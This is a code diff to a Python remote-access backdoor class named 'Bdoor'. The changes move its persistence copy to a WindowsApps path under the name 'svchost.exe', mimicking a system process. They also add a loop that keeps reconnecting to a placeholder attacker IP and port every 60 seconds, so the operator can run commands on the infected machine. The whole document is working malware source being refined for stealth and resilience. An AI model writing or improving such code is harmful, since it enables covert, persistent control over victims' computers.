@@ -11,6 +11,7 @@ import subprocess
 import base64
 import sys
 import os
+import time
 
 class Bdoor:
 
@@ -27,7 +28,7 @@ class Bdoor:
         self.cli = self.cli_p["default"]
     
     def pers__(self):
-        l_pers__ = os.environ["AppData"] + "\\Microsoft\\svchost.exe"
+        l_pers__ = os.environ["localappdata"] + "\\Microsoft\\WindowsApps\\svchost.exe"
         if not os.path.exists(l_pers__):
             # Copy the current executalbe file.
             shutil.copyfile(sys.executable, l_pers__)
@@ -101,7 +102,7 @@ class Bdoor:
                     self.send_data("CLI preferred: " + self.cli)
                 else:
                     self.exec_cmd(comm)
-            except (TimeoutError, ConnectionRefusedError, ConnectionAbortedError, BrokenPipeError, ConnectionError):
+            except (TimeoutError, ConnectionAbortedError, BrokenPipeError):
                 pass
             except (KeyError, TypeError):
                 self.send_data(f'[Bad command]: {traceback.format_exc()}')
@@ -114,5 +115,10 @@ class Bdoor:
         # exiting with sys makes to not to pop a message windows up.
         sys.exit()
 
-my_bd = Bdoor("<ip>", <prt>)
-my_bd.run()
+while True:
+    try:
+        my_bd = Bdoor("<ip>", <prt>)
+        my_bd.run()
+    except (ConnectionRefusedError, ConnectionAbortedError, ConnectionError):
+        pass
+    time.sleep(60)
